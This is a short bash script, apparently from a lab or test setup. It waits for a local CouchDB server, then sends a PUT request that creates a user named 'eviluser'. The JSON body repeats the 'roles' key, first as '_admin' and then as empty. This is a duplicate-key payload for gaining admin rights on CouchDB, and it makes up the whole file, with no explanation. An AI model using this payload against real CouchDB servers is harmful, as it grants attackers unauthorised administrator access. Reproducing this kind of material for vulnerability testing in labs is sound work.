#!/bin/bash
# Wait for CouchDB to become healthy
until curl -s http://localhost:5984/_up | grep -q "couchdb is up"; do
  echo "Waiting for CouchDB..."
  sleep 2
done

# Create the malicious user document using a raw JSON payload with duplicate keys
curl -s -X PUT http://admin:secret@localhost:5984/_users/org.couchdb.user:eviluser \
  -H "Content-Type: application/json" \
  -d '{"_id":"org.couchdb.user:eviluser","type":"user","name":"eviluser","password":"evilpass","roles":["_admin"],"roles":[]}'

echo "Evil user created."
